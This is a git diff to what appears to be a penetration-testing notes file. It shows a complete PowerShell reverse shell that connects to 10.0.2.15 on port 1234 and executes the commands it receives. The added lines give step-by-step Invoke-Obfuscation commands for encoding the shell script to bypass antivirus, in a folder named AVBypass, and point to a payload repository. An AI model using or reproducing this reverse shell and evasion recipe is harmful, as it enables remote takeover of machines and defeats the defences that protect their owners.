@@ -108,7 +108,29 @@ sudo apt install powershell -y
 ```
 $client = New-Object System.Net.Sockets.TCPClient('10.0.2.15',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-- Remove `powershell -nop -c` and double-quotes `"` and save as `shell.ps1`.
+- https://github.com/swisskyrepo/PayloadsAllTheThings
+- Remove `powershell -nop -c` and double-quotes `"`, then save as `shell.ps1`.
+
+```
+pwsh
+cd ./Invoke-Obfuscation/
+Import-Module ./Invoke-Obfuscation.psd1
+cd ..
+Invoke-Obfuscation
+```
+```
+SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
+ENCODING
+1
+```
+```
+BACK
+
+SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
+AST
+ALL
+1
+```
 
 ## BadBlue httpd 2.7
 ```
